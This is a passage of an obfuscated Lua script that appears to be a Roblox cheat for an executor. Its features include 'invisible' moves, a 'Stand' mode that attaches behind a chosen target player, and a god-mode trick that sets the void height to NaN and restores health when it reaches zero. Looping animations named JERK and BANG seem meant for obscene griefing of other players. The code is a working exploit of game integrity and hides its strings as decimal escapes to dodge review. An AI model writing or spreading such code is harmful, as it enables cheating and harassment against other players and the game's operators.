 pcall( function () local _lIlIIllIII = _llIlIIlIll.Character and _llIlIIlIll.Character:FindFirstChildWhichIsA("\072\117\109\097\110\111\105\100") if _lIlIIllIII then _lIlIIllIII.PlatformStand = false end
 end
 ) else _IIIllIIlll:Notify({ Title = _IlIIIlllII("\083\116\097\110\100"), Content = "\080\108\101\097\115\101\032\115\101\108\101\099\116\032\097\032\118\097\108\105\100\032\116\097\114\103\101\116\032\102\105\114\115\116\046", _IlllIlIllI = 0x3 }) pcall( function () _lIIlIllIlI.StandMethodDropdown:SetValue("\079\102\102") end
 ) end
 end
 end
 , }) do local _IlIIIlllIl = { "\082\097\110\100\111\109" } for _lIIlIllIlI, _lIllllllII in ipairs(_IllIllIIlI) do _IlIIIlllIl[#_IlIIIlllIl + 0x1] = _lIllllllII.name end
 _lIIIlIlIll:AddDropdown("\083\116\097\110\100\073\100\108\101\065\110\105\109\068\114\111\112\100\111\119\110", { Text = "\073\100\108\101\032\065\110\105\109\097\116\105\111\110", Values = _IlIIIlllIl, Default = "\082\097\110\100\111\109", Callback = function () if _IllIIlIIll and _lIllllllll then if _IIIIIIIlIl then _IIIIIIIlIl:Disconnect() _IIIIIIIlIl = nil end
 if _llllllllIl then pcall( function () _llllllllIl:Stop(0x0) end
 ) _llllllllIl = nil end
 _IlIlllIlll = 0x0 task.defer(_IIIIllIIIl) end
 end
 , }) end
 _lIIIlIlIll:AddLabel("\072\111\119\032\116\111\032\117\115\101\032\083\116\097\110\100\058", true) _lIIIlIlIll:AddLabel("\083\101\108\101\099\116\032\097\032\116\097\114\103\101\116\032\097\110\100\032\099\104\111\111\115\101\032\070\111\108\108\111\119\032\111\114\032\068\111\110\039\116\032\070\111\108\108\111\119\046", true) _lIIIlIlIll:AddLabel("\083\116\097\110\100\032\097\116\116\097\099\104\101\115\032\098\101\104\105\110\100\032\116\104\101\032\116\097\114\103\101\116\032\097\110\100\032\109\105\114\114\111\114\115\032\116\104\101\105\114\032\112\111\115\105\116\105\111\110\046", true) _lIIIlIlIll:AddLabel("\051\032\098\108\111\099\107\115\032\105\110\032\097\032\114\111\119\032\102\114\111\109\032\116\104\101\032\116\097\114\103\101\116\032\116\111\103\103\108\101\115\032\116\104\101\032\109\111\100\101\046", true) _lIIIlIlIll:AddLabel("\087\104\101\110\032\121\111\117\032\117\115\101\032\097\032\109\111\118\101\032\097\110\100\032\116\104\101\032\116\097\114\103\101\116\032\104\097\115\032\116\104\097\116\032\109\111\118\101\032\111\110\032\099\111\111\108\100\111\119\110\044\032\083\116\097\110\100\032\097\117\116\111\045\117\115\101\115\032\105\116\046", true) _lIIIlIlIll:AddLabel("\073\110\032\068\111\110\039\116\032\070\111\108\108\111\119\032\109\111\100\101\044\032\121\111\117\032\115\116\097\121\032\105\110\032\112\108\097\099\101\046\032\083\116\097\110\100\032\111\110\108\121\032\097\099\116\115\032\100\117\114\105\110\103\032\121\111\117\114\032\109\111\118\101\115\046", true) local function _IIlIIllIII() getgenv()._standActivateFn = function (_IllIIllllI) _IllIIlllll(_IllIIllllI) _IIlIIllIII() end
 getgenv()._standDeactivateFn = function () _IlIIIIIlIl() _IIlIIllIII() end
 end
 _IIlIIllIII() end
 _llIIllllIl:AddButton({ Text = "\084\111\103\103\108\101\032\065\108\108\032\079\110", Callback = function () for _llIlIIIllI, _lIllllllII in pairs(_llIIllIlll) do if _llIlIIIllI:find("\094\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095") and _lIllllllII.Type == "\084\111\103\103\108\101" then _lIllllllII:SetValue(true) end
 end
 for _llIlIIIllI, _lIllllllII in pairs(_lIIlIllIlI) do if _llIlIIIllI:find("\094\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095") and _lIllllllII.Type == "\068\114\111\112\100\111\119\110" then local _IIlIllIlII = {} for _lIIlIllIlI, _IIlIlIIlII in pairs(_lIllllllII.Values) do _IIlIllIlII[_IIlIlIIlII] = true end
 _lIllllllII:SetValue(_IIlIllIlII) end
 end
 end
 , }):AddButton({ Text = "\084\111\103\103\108\101\032\065\108\108\032\079\102\102", Callback = function () for _llIlIIIllI, _lIllllllII in pairs(_llIIllIlll) do if _llIlIIIllI:find("\094\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095") and _lIllllllII.Type == "\084\111\103\103\108\101" then _lIllllllII:SetValue(false) end
 end
 for _llIlIIIllI, _lIllllllII in pairs(_lIIlIllIlI) do if _llIlIIIllI:find("\094\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095") and _lIllllllII.Type == "\068\114\111\112\100\111\119\110" then _lIllllllII:SetValue({}) end
 end
 end
 , }) _llIIllllIl:AddToggle("\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095\066\108\111\099\107", { Text = "\073\110\118\105\115\105\098\108\101\032\066\108\111\099\107", Default = false, }) _llIIllllIl:AddToggle("\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095\066\108\111\099\107\067\111\108\111\114", { Text = "\066\108\111\099\107\032\067\111\108\111\114", Default = false, }):AddColorPicker("\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095\066\108\111\099\107\067\111\108\111\114\049", { Default = Color3.fromRGB(0x0, 0xFF, 0xFF), Title = "\083\116\097\114\116", }):AddColorPicker("\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095\066\108\111\099\107\067\111\108\111\114\050", { Default = Color3.fromRGB(0x0, 0x0, 0xFF), Title = "\077\105\100\100\108\101", Transparency = 0x0, }):AddColorPicker("\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095\066\108\111\099\107\067\111\108\111\114\051", { Default = Color3.fromRGB(0xFF, 0x0, 0x0), Title = "\069\110\100", Transparency = 0x0, }) _llIIllllIl:AddToggle("\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095\067\111\117\110\116\101\114", { Text = "\073\110\118\105\115\105\098\108\101\032\067\111\117\110\116\101\114", Default = false, }) _llIIllllIl:AddToggle("\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095\067\111\117\110\116\101\114\072\105\116", { Text = "\073\110\118\105\115\105\098\108\101\032\067\111\117\110\116\101\114\032\072\105\116", Default = false, }) _llIIllllIl:AddDropdown("\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095\083\097\105\116\097\109\097", { Text = "\073\110\118\105\115\105\098\108\101\032\083\097\105\116\097\109\097", Values = { "\073\110\118\105\115\105\098\108\101\032\085\108\116", "\073\110\118\105\115\105\098\108\101\032\084\097\098\108\101\032\070\108\105\112", "\073\110\118\105\115\105\098\108\101\032\083\101\114\105\111\117\115\032\080\117\110\099\104", "\073\110\118\105\115\105\098\108\101\032\079\109\110\105\045\068\105\114\101\099\116\105\111\110\097\108\032\080\117\110\099\104" }, Multi = true, Default = {}, Searchable = true, }) _llIIllllIl:AddDropdown("\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095\071\097\114\111\117", { Text = "\073\110\118\105\115\105\098\108\101\032\071\097\114\111\117", Values = { "\073\110\118\105\115\105\098\108\101\032\085\108\116" }, Multi = true, Default = {}, Searchable = true, }) _llIIllllIl:AddDropdown("\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095\083\111\110\105\099", { Text = "\073\110\118\105\115\105\098\108\101\032\083\112\101\101\100\045\111\039\045\083\111\110\105\099", Values = { "\073\110\118\105\115\105\098\108\101\032\085\108\116" }, Multi = true, Default = {}, Searchable = true, }) _llIIllllIl:AddDropdown("\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095\071\101\110\111\115", { Text = "\073\110\118\105\115\105\098\108\101\032\071\101\110\111\115", Values = { "\073\110\118\105\115\105\098\108\101\032\085\108\116", "\073\110\118\105\115\105\098\108\101\032\073\110\099\105\110\101\114\097\116\101" }, Multi = true, Default = {}, Searchable = true, }) _llIIllllIl:AddDropdown("\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095\084\097\116\115\117\109\097\107\105", { Text = "\073\110\118\105\115\105\098\108\101\032\084\097\116\115\117\109\097\107\105", Values = { "\073\110\118\105\115\105\098\108\101\032\067\114\117\115\104\105\110\103\032\080\117\108\108", "\073\110\118\105\115\105\098\108\101\032\087\105\110\100\115\116\111\114\109\032\070\117\114\121", "\073\110\118\105\115\105\098\108\101\032\083\116\111\110\101\032\071\114\097\118\101", "\073\110\118\105\115\105\098\108\101\032\069\120\112\117\108\115\105\118\101\032\080\117\115\104", "\073\110\118\105\115\105\098\108\101\032\085\108\116", "\073\110\118\105\115\105\098\108\101\032\084\101\114\114\105\098\108\101\032\084\111\114\110\097\100\111", "\073\110\118\105\115\105\098\108\101\032\084\101\114\114\105\098\108\101\032\084\111\114\110\097\100\111\032\070\105\110\105\115\104\101\114" }, Multi = true, Default = {}, Searchable = true, }) _llIIllllIl:AddDropdown("\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095\065\116\111\109\105\099\083\097\109\117\114\097\105", { Text = "\073\110\118\105\115\105\098\108\101\032\065\116\111\109\105\099\032\083\097\109\117\114\097\105", Values = { "\073\110\118\105\115\105\098\108\101\032\065\116\109\111\115\032\067\108\101\097\118\101", "\073\110\118\105\115\105\098\108\101\032\085\108\116", "\073\110\118\105\115\105\098\108\101\032\083\117\110\115\101\116", "\073\110\118\105\115\105\098\108\101\032\083\111\108\097\114\032\067\108\101\097\118\101", "\073\110\118\105\115\105\098\108\101\032\083\117\110\114\105\115\101", "\073\110\118\105\115\105\098\108\101\032\083\117\110\114\105\115\101\032\070\105\110\105\115\104\101\114", "\073\110\118\105\115\105\098\108\101\032\065\116\111\109\105\099\032\083\108\097\115\104", "\073\110\118\105\115\105\098\108\101\032\065\116\111\109\105\099\032\083\108\097\115\104\032\070\105\110\105\115\104\101\114" }, Multi = true, Default = {}, Searchable = true, }) _llIIllllIl:AddDropdown("\073\110\118\105\115\105\098\108\101\077\111\118\101\115\095\083\117\105\114\121\117", { Text = "\073\110\118\105\115\105\098\108\101\032\083\117\105\114\121\117", Values = { "\066\117\108\108\101\116\032\066\097\114\114\097\103\101" }, Multi = true, Default = {}, Searchable = true, }) local _lIIlllIlII = { L_KEY = { Id = "\049\050\049\053\055\050\050\049\052", Speed = 0x1, StartTime = 0.5, Track = nil, IsActive = false }, F2_KEY = { Id = "\049\055\057\050\050\052\050\051\052", Speed = 0x1, StartTime = 0x0, Track = nil, IsActive = false }, TPOSE_A = { Id = "\049\053\053\048\051\048\048\052\057\048\048", Speed = 0x0, StartTime = 1.6, Track = nil, IsActive = false }, JERK = { Id = "\055\050\048\052\050\048\050\052", Speed = 0x1, StartTime = 0x0, Track = nil, IsActive = false }, BANG = { Id = "\049\052\056\056\052\048\051\055\049", Speed = 0x1, StartTime = 0x0, Track = nil, IsActive = false, Priority = Enum.AnimationPriority.Action4 }, WAVE = { Id = "\049\050\056\055\055\055\057\055\051", Speed = 0x1, StartTime = 0x0, Track = nil }, POINT = { Id = "\049\050\056\056\053\051\051\053\055", Speed = 0x1, StartTime = 0x0, Track = nil }, HAPPY = { Id = "\049\050\057\052\050\051\048\051\048", Speed = 0x1, StartTime = 0x0, Track = nil }, LAUGH = { Id = "\049\050\057\052\050\051\049\051\049", Speed = 0x1, StartTime = 0x0, Track = nil }, MUSTACHE = { Id = "\054\053\048\054\055\056\049\051", Speed = 0x0, StartTime = 0.2, Track = nil, IsActive = false, Priority = Enum.AnimationPriority.Action4 }, } local _lllIIIIIlI = { ["\049\050\049\053\055\050\050\049\052"] = 1e13, ["\055\050\048\052\050\048\050\052"] = 1e13, ["\049\055\057\050\050\052\050\051\052"] = -1e9, ["\049\053\053\048\051\048\048\052\057\048\048"] = 1e7, ["\049\056\048\052\051\053\053\055\049"] = 1e5, ["\049\052\056\056\052\048\051\055\049"] = -1e9, ["\054\053\048\054\055\056\049\051"] = -1e9, ["\049\050\056\055\055\055\057\055\051"] = -1e9, ["\049\050\056\056\053\051\051\053\055"] = -1e9, ["\049\050\057\052\050\051\048\051\048"] = -1e9, ["\049\050\057\052\050\051\049\051\049"] = -1e9, } local _llIlIIllII = 0.1 local Players = game:GetService("\080\108\097\121\101\114\115") local RunService = game:GetService("\082\117\110\083\101\114\118\105\099\101") local _IlllIIllII = game:GetService("\085\115\101\114\073\110\112\117\116\083\101\114\118\105\099\101") local _llIlIIlIll = Players.LocalPlayer local _lIIIIIIlIl local _llIllIlIlI = nil local _lllIllIlIl = false local _llIlIIIIII = {} local _IllIlIllIl = {} local _IlIlllllll = false local _IllIlllIIl = nil local _lllIIlllII = nil local _IlIlIIlllI = nil local _IllIIlIllI = false local _IIIlIlIIIl = nil local _lIIlllIIII = nil local _lIIIIIIlll = nil local _lIllIlllll = {_IIIIlllIll = nil, _IlIlIIIlII = nil} local _lIlIllllII = {} local _IllIllllll = _lllIIllIII and game:GetService("\083\116\097\114\116\101\114\080\108\097\121\101\114"):FindFirstChild("\083\116\097\114\116\101\114\067\104\097\114\097\099\116\101\114") or nil local _IllllIIlII = true local _IlIlIlIIll = {} local _llllIlllll = false _lIllIllIIl = nil local _IllllIlIlI = false local _IIIllIIlll = false local _IlIlIlllll = function () end
 local _lIIIlIlIlI = function () end
 local _lIIIllIlIl = { Flying = false, ["\084\111\117\099\104\032\070\108\105\110\103"] = false, ["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"] = Vector3.new(0x0, 0x0, 0x0), } local _IllllIlIII = { Fly = false, ["\076\111\099\107\045\111\110"] = false, ["\084\111\117\099\104\032\070\108\105\110\103"]= false, } getgenv().InvisActive = false getgenv().FUCActive = false getgenv().OldPos = nil getgenv().FPDH = workspace.FallenPartsDestroyHeight workspace.FallenPartsDestroyHeight = 0x0/0x0 local _llllIlIIIl = workspace:GetPropertyChangedSignal("\070\097\108\108\101\110\080\097\114\116\115\068\101\115\116\114\111\121\072\101\105\103\104\116"):Connect( function () local _IllIllIIll = workspace.FallenPartsDestroyHeight if _IllIllIIll == _IllIllIIll then workspace.FallenPartsDestroyHeight = 0x0/0x0 end
 end
 ) local _IllIllIlII = Instance.new("\080\097\114\116", workspace) _IllIllIlII.CFrame = CFrame.new(0x0, -0x2718, 0x0) _IllIllIlII.Anchored = true _IllIllIlII.Size = Vector3.new(0x800, 0xA, 0x800) _IllIllIlII.Transparency = 0.5 _IllIllIlII.CanCollide = true _IllIllIlII.Name = game:GetService("\072\116\116\112\083\101\114\118\105\099\101"):GenerateGUID() local _IlIlIIllII = 0x64 local _IlllIlIllI = nil local _IIIllIIlIl = nil local _lIlIIlIIll = nil local function _IlIllIllII(_IIllIIlllI) if not _IIllIIlllI then return end
 local _lIlIIllIII = _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") or _IIllIIlllI:WaitForChild("\072\117\109\097\110\111\105\100", 0x3) local _lIlIllIlIl = _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") or _IIllIIlllI:WaitForChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116", 0x3) if not _lIlIIllIII or not _lIlIllIlIl then return end
 _IlIlIIllII = _lIlIIllIII.Health if _IlllIlIllI then _IlllIlIllI:Disconnect() _IlllIlIllI = nil end
 if _IIIllIIlIl then _IIIllIIlIl:Disconnect() _IIIllIIlIl = nil end
 _IIIllIIlIl = RunService.RenderStepped:Connect( function () local _IIIlIIIIIl = _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IIIlIIIIIl then _IlIlIIllII = _lIlIIllIII.Health _IllIllIlII.CFrame = CFrame.new(_IIIlIIIIIl.Position.X, -0x2718, _IIIlIIIIIl.Position.Z) end
 end
 ) _IlllIlIllI = _lIlIIllIII.HealthChanged:Connect( function (hp) local _IIIlIIIIIl = _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if hp <= 0x0 and _IIIlIIIIIl and _IIIlIIIIIl.CFrame.Y <= 0x0 then _lIlIIllIII.Health = _IlIlIIllII end
 end
 ) end
 _IlIllIllII(_llIlIIlIll.Character) _lIlIIlIIll = _llIlIIlIll.CharacterAdded:Connect( function (_IIllIIlllI) task.wait(0.1) _IlIllIllII(_IIllIIlllI) end
 ) local _lIIIlIIllI = nil local _IIIllIlIll = nil local _IlIlIIlllI = nil local _IllIlIlllI = false local _IllIllIIll = {} local _llIIlllIIl = {} local _lIIlIlIlII = setmetatable({}, { __mode = "\107" }) local function _lIlIIIIlll(_IIllIIlllI) if not _IIllIIlllI then return nil end
 local _llIIlIllII = _IIllIIlllI:FindFirstChild("\077\111\118\105\110\103\069\120\099\108\117\115\105\111\110") if _llIIlIllII then return _llIIlIllII end
 local _llllIlIIlI = Instance.new("\070\111\108\100\101\114") _llllIlIIlI.Name = "\077\111\118\105\110\103\069\120\099\108\117\115\105\111\110" pcall( function () _llllIlIIlI:SetAttribute("\082\101\118\101\110\097\110\116\079\119\110\101\100", true) end
 ) _llllIlIIlI.Parent = _IIllIIlllI _lIIlIlIlII[_llllIlIIlI] = true return _llllIlIIlI end
 local function _IIIlIIlIlI(_IIllIIlllI) if not _IIllIIlllI then return end
 _lIlIIIIlll(_IIllIIlllI) local _IllIIlIllI = _IIllIIlllI.ChildRemoved:Connect( function (_IIIlIIIlII) if _IIIlIIIlII.Name == "\077\111\118\105\110\103\069\120\099\108\117\115\105\111\110" and getgenv().RevenantLoaded then task.defer(_lIlIIIIlll, _IIllIIlllI) end
 end
 ) table.insert(_llIIlllIIl, _IllIIlIllI) end
 _IIIlIIlIlI(_llIlIIlIll.Character) table.insert(_llIIlllIIl, _llIlIIlIll.CharacterAdded:Connect( function (_IIllIIlllI) task.wait(0.1) _IIIlIIlIlI(_IIllIIlllI) end
 )) table.insert(_IllIllIIll, function () for _lIIlIllIlI, _IllIIlIllI in ipairs(_llIIlllIIl) do pcall( function () _IllIIlIllI:Disconnect() end
 ) end
 _llIIlllIIl = {} local _IIllIIlllI = _llIlIIlIll.Character local _llllIlIIlI = _IIllIIlllI and _IIllIIlllI:FindFirstChild("\077\111\118\105\110\103\069\120\099\108\117\115\105\111\110") if _llllIlIIlI and (_lIIlIlIlII[_llllIlIIlI] or _llllIlIIlI:GetAttribute("\082\101\118\101\110\097\110\116\079\119\110\101\100")) then pcall( function () _llllIlIIlI:Destroy() end
 ) end
 end
 ) if getgenv()._standDeactivateFn then table.insert(_IllIllIIll, getgenv()._standDeactivateFn) end
 local _IlIlllIIll = nil local function _IlIlIllIII() return _IlllIIllII:GetFocusedTextBox() ~= nil end
 local function _IIIllIIlII(_IlIlIIIlII) local _llllllllII, _IlllIlIlll = pcall( function () return _IlIlIIIlII.DisplayName end
 ) if not _llllllllII or not _IlllIlIlll or _IlllIlIlll == "" then return _IlIlIIIlII.Name end
 for _lIIlIllIlI, _lIIlIIlllI in pairs(Players:GetPlayers()) do if _lIIlIIlllI ~= _IlIlIIIlII and _lIIlIIlllI.DisplayName == _IlllIlIlll then return _IlIlIIIlII.Name end
 end
 return _IlllIlIlll end
 local function _lIlllIIIII() local _IllIIlIllI = {} for _lIIlIllIlI, _lIllllllII in pairs(Players:GetPlayers()) do if _lIllllllII ~= _llIlIIlIll then _IllIIlIllI[#_IllIIlIllI+0x1] = _IIIlIllIlI(_lIllllllII) end
 end
 return _IllIIlIllI end
 local function _IIllllIllI(_IllIlIlIII) return _IIlllIllII(_IllIlIlIII) end
 local function _llIIIIIlll() if _lIIIlIIllI then _lIIIlIIllI:Disconnect() _lIIIlIIllI = nil end
 if _IIIllIlIll then _IIIllIlIll:Disconnect() _IIIllIlIll = nil end
 end
 local function _IIIIIlllll(_IllIIllllI) if not _IllIIllllI or not _IllIIllllI.Parent then return end
 _llIIIIIlll() if _IllIIllllI.Character then pcall( function () _IllIlIlllI = true workspace.CurrentCamera.CameraSubject = _IllIIllllI.Character _IllIlIlllI = false end
 ) end
 _lIIIlIIllI = _IllIIllllI.CharacterAdded:Connect( function () repeat task.wait() until _IllIIllllI.Character and _IllIIllllI.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") pcall( function () _IllIlIlllI = true workspace.CurrentCamera.CameraSubject = _IllIIllllI.Character _IllIlIlllI = false end
 ) end
 ) _IIIllIlIll = workspace.CurrentCamera:GetPropertyChangedSignal("\067\097\109\101\114\097\083\117\098\106\101\099\116"):Connect( function () if _IllIlIlllI then return end
 if not _IllIIllllI or not _IllIIllllI.Parent then _llIIIIIlll() pcall( function () workspace.CurrentCamera.CameraSubject = _llIlIIlIll.Character end
 ) return end
 if _IllIIllllI.Character then pcall( function () _IllIlIlllI = true workspace.CurrentCamera.CameraSubject = _IllIIllllI.Character _IllIlIlllI = false end
 ) end
 end
 ) end
 local function _IIIIllIIlI() _llIIIIIlll() pcall( function () workspace.CurrentCamera.CameraSubject = _llIlIIlIll.Character end
 ) end
 local function _lIlIllllll() _IllIlIllIl = {} for key, _lllIIllllI in pairs(_lIIlllIlII) do if key ~= "\087\065\086\069" and key ~= "\080\079\073\078\084" and key ~= "\072\065\080\080\089" and key ~= "\076\065\085\071\072" and key ~= "\070\050\095\075\069\089" then _IllIlIllIl[key] = _lllIIllllI.IsActive end
 end
 _IllIlIllIl["\095\095\084\080\111\115\101\065\099\116\105\118\101"] = _IlIlllllll end
 local function _lllllIlIII() if not next(_IllIlIllIl) then return end
 local _IIllIIlllI = _llIlIIlIll.Character local _lIIllIllll = tick() + 0x2 while not _IIllIIlllI and tick() < _lIIllIllll do task.wait(0.05) _IIllIIlllI = _llIlIIlIll.Character end
 if not _IIllIIlllI then return end
 local _IIIlllIIlI = _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") or _IIllIIlllI:WaitForChild("\072\117\109\097\110\111\105\100", 0x1) if not _IIIlllIIlI then return end
 local _IIlIIIIIIl = _IIIlllIIlI:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") or _IIIlllIIlI:WaitForChild("\065\110\105\109\097\116\111\114", 0x1) if not _IIlIIIIIIl then return end
 task.wait(0.05) for key, _IlllIIlllI in pairs(_IllIlIllIl) do if key:sub(0x1, 0x2) == "\095\095" then continue end
 if _IlllIIlllI and not _lIIlllIlII[key].IsActive then _lIIlllIlII[key].IsActive = false task.spawn( function () _IlllllllII(_lIIlllIlII[key]) end
 ) end
 end
 if _IllIlIllIl["\095\095\084\080\111\115\101\065\099\116\105\118\101"] and not _IlIlllllll then task.spawn(_lIIlIIIlll) end
 end
 local function _IlIllIIIlI(_lllIIllllI) if _lllIIllllI.Track then _lllIIllllI.Track:Stop() _lllIIllllI.Track:Destroy() _lllIIllllI.Track = nil end
 end
 local function _IIIIIllIIl() local _IlIIIlIlll = _lIIlllIlII.TPOSE_A if _IlIIIlIlll.Track then pcall( function () if _IlIIIlIlll.Track.IsPlaying then _IlIIIlIlll.Track:Stop() end
 end
 ) pcall( function () _IlIIIlIlll.Track:Destroy() end
 ) _IlIIIlIlll.Track = nil end
 _lllIIlllII = nil end
 local function _IlIIIllIII(_lllIIllllI, _IIlIIIIIIl, priority, weight) local _IlIllllIlI = Instance.new("\065\110\105\109\097\116\105\111\110") _IlIllllIlI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _lllIIllllI.Id local _IlIlIlIlIl = _IIlIIIIIIl:LoadAnimation(_IlIllllIlI) _IlIlIlIlIl.Priority = priority _IlIlIlIlIl.Looped = true _IlIlIlIlIl:Play() _IlIlIlIlIl:AdjustSpeed(0x0) if _lllIIllllI.StartTime and _lllIIllllI.StartTime > 0x0 then _IlIlIlIlIl.TimePosition = _lllIIllllI.StartTime end
 pcall( function () _IlIlIlIlIl:AdjustWeight(weight or 1e8) end
 ) return _IlIlIlIlIl end
 local function _IllIIlIlll(_lllIIllllI, looped, priority) looped = looped == nil and true or looped local _lIIlIllIll = _llIlIIlIll.Character if not _lIIlIllIll then return end
 local _IIIlllIIlI = _lIIlIllIll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _IIlIIIIIIl = _IIIlllIIlI and _IIIlllIIlI:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if not _IIlIIIIIIl then return end
 if _lllIIllllI.Track and _lllIIllllI.Track.IsPlaying then return _lllIIllllI.Track end
 local _IlIllllIlI = Instance.new("\065\110\105\109\097\116\105\111\110") _IlIllllIlI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _lllIIllllI.Id _lllIIllllI.Track = _IIlIIIIIIl:LoadAnimation(_IlIllllIlI) local _lIIIIlllll = (_lllIIllllI.Id == "\049\050\049\053\055\050\050\049\052" or _lllIIllllI.Id == "\055\050\048\052\050\048\050\052") _lllIIllllI.Track.Priority = _lllIIllllI.Priority or (_lIIIIlllll and Enum.AnimationPriority.Action4 or Enum.AnimationPriority.Action3) _lllIIllllI.Track.Looped = looped local _lllIlIIllI = _lllIIIIIlI[_lllIIllllI.Id] if _lllIlIIllI then _lllIIllllI.Track:AdjustWeight(_lllIlIIllI) end
 _lllIIllllI.Track:Play() _lllIIllllI.Track:AdjustSpeed(_lllIIllllI.Speed) _lllIIllllI.Track.TimePosition = _lllIIllllI.StartTime return _lllIIllllI.Track end
 local _IlIIlIlIlI = { WAVE=true, POINT=true, HAPPY=true, LAUGH=true, F2_KEY=true, TPOSE_A=true } local function _IlIlIIIlIl(exceptL_KEY, fromInvis) _llIlIIIIII = {} for key, _lllIIllllI in pairs(_lIIlllIlII) do if not _IlIIlIlIlI[key] then if exceptL_KEY and key == "\076\095\075\069\089" then continue end
 if fromInvis and (key == "\076\095\075\069\089" or key == "\074\069\082\075") then continue end
 if _lllIIllllI.IsActive and _lllIIllllI.Track and _lllIIllllI.Track.IsPlaying then _llIlIIIIII[key] = true _lllIIllllI.Track:Stop() end
 end
 end
 if _IlIlllllll then _llIlIIIIII["\084\080\079\083\069\095\065"] = true if _IllIlllIIl then _IllIlllIIl:Disconnect() _IllIlllIIl = nil end
 _IIIIIllIIl() _IlIlllllll = false if not fromInvis then pcall( function () if _llIIllIlll.TogTPose then _IllIlllIlI.TPose = true _llIIllIlll.TogTPose:SetValue(false) _IllIlllIlI.TPose = false end
 end
 ) end
 end
 end
 local function _IlIllIlIlI(fromInvis) for key, _lllIIllllI in pairs(_lIIlllIlII) do if not _IlIIlIlIlI[key] then if fromInvis and (key == "\076\095\075\069\089" or key == "\074\069\082\075") then continue end
 if _llIlIIIIII[key] and _lllIIllllI.IsActive then if _lllIIllllI.Track then _lllIIllllI.Track:Play() _lllIIllllI.Track:AdjustSpeed(_lllIIllllI.Speed) else _IllIIlIlll(_lllIIllllI, true, Enum.AnimationPriority.Action4) end
 end
 end
 end
 if _llIlIIIIII["\084\080\079\083\069\095\065"] and not fromInvis and _llIIllIlll.TogTPose and _llIIllIlll.TogTPose.Value then _IlIlllllll = false _IllIlllIIl = RunService.Heartbeat:Connect( function () if getgenv().InvisActive or getgenv().FUCActive then return end
 local _IIllIIlllI = _llIlIIlIll.Character local _IIIlllIIlI = _IIllIIlllI and _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _IIlIIIIIIl = _IIIlllIIlI and _IIIlllIIlI:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if not _IIlIIIIIIl then return end
 if _lllIIlllII ~= _IIlIIIIIIl then _IIIIIllIIl() _lllIIlllII = _IIlIIIIIIl _lIIlllIlII.TPOSE_A.Track = _IlIIIllIII(_lIIlllIlII.TPOSE_A, _IIlIIIIIIl, Enum.AnimationPriority.Action3, 1e12) return end
 local _IlIIIlIlll = _lIIlllIlII.TPOSE_A if not _IlIIIlIlll.Track or not _IlIIIlIlll.Track.IsPlaying then if _IlIIIlIlll.Track then pcall( function () _IlIIIlIlll.Track:Destroy() end
 ) end
 _IlIIIlIlll.Track = _IlIIIllIII(_IlIIIlIlll, _IIlIIIIIIl, Enum.AnimationPriority.Action3, 1e12) end
 end
 ) _IlIlllllll = true end
 _llIlIIIIII = {} end
 local function _IlllllllII(_lllIIllllI) _lllIIllllI.IsActive = not _lllIIllllI.IsActive if _lllIIllllI.IsActive then _IllIIlIlll(_lllIIllllI, true, Enum.AnimationPriority.Action4) else _IlIllIIIlI(_lllIIllllI) end
 if _lllIIllllI.IsActive and not _lIIIIIIlIl then _lIIIIIIlIl = RunService.Heartbeat:Connect( function () if _lllIllIlIl then return end
 for key, _llIIIlIIIl in pairs(_lIIlllIlII) do if not _IlIIlIlIlI[key] and _llIIIlIIIl.IsActive then if getgenv().InvisActive and key ~= "\076\095\075\069\089" and key ~= "\074\069\082\075" then continue end
 if not _llIIIlIIIl.Track or _llIIIlIIIl.Track.Parent == nil then _IllIIlIlll(_llIIIlIIIl, true, Enum.AnimationPriority.Action4) else if not _llIIIlIIIl.Track.IsPlaying then _llIIIlIIIl.Track:Play() end
 if key == "\076\095\075\069\089" and _llIIIlIIIl.Track.TimePosition < 0.1 then _llIIIlIIIl.Track.TimePosition = 0.5 end
 end
 end
 end
 end
 ) elseif not _lllIIllllI.IsActive then local _IIIIIlIlII = false for key, _llIIIlIIIl in pairs(_lIIlllIlII) do if not _IlIIlIlIlI[key] and _llIIIlIIIl.IsActive then _IIIIIlIlII = true break end
 end
 if not _IIIIIlIlII and _lIIIIIIlIl then _lIIIIIIlIl:Disconnect() _lIIIIIIlIl = nil end
 end
 end
 local function _lIlIIllIll(_lllIIllllI) if _llIllIlIlI then local _IIlIlIlIIl = _llIllIlIlI _llIllIlIlI = nil pcall( function () _IIlIlIlIIl:Stop() end
 ) pcall( function () _IIlIlIlIIl:Destroy() end
 ) end
 if not _lllIllIlIl then _IlIlIIIlIl(true) _lllIllIlIl = true end
